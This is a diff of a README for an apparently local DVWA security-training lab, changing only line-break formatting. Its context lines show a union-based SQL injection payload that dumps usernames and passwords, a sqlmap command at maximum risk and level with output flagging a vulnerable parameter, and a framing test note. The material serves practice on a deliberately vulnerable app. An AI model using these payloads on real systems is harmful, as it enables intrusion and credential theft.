@@ -11,8 +11,8 @@ docker run --rm -it -p 80:80 vulnerables/web-dvwa
 4. `%' and 1=0 union select null, concat(user,':',password) from users`
 
 ## SQL-injection scan example
-`sqlmap -r sqlmap.example --dbms=mysql --risk=3 --level=5`\n
-GET parameter 'id' is **vulnerable**. 
+`sqlmap -r sqlmap.example --dbms=mysql --risk=3 --level=5`<br/>
+GET parameter 'id' is **vulnerable**. <br/>
 sqlmap identified the following injection point(s) with a total of 502 HTTP(s) requests:
 ```
 Parameter: id (GET)
@@ -22,7 +22,7 @@ Parameter: id (GET)
 ```
 
 ## XSS-injection example
-open iframe.html in browser you should not see the site\n
-Refused to display 'https://ya.ru/' in a frame because it set 'X-Frame-Options' to 'deny'.\n
+open iframe.html in browser you should not see the site<br/>
+Refused to display 'https://ya.ru/' in a frame because it set 'X-Frame-Options' to 'deny'.<br/>
 But on the vulnerable app like localhost/login.php you will see the form
 
